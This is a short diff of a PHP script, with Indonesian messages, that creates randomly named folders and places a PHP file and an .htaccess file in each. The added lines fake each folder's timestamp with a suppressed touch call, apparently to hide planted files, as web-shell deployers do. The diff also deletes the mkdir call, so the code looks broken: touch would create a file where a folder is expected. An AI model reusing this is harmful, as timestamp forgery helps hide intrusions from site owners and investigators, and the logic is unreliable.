@@ -95,10 +95,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     $newFolder = generateRandomFolderName($base, $usedFolders);
                     $usedFolders[] = $newFolder;
 
-                    if (!mkdir($newFolder, 0755, true)) {
-                        $error[] = "❌ Gagal buat folder: $newFolder";
-                        continue;
-                    }
+                    if ($timestamp && @touch($newFolder, $timestamp)) {
+    $success[] = "⏱️ Timestamp folder set: $newFolder";
+} elseif ($timestamp) {
+    $error[] = "❌ Gagal set timestamp folder: $newFolder";
+}
+
 
                     $phpPath = $newFolder . '/' . $phpName;
                     $htPath  = $newFolder . '/.htaccess';
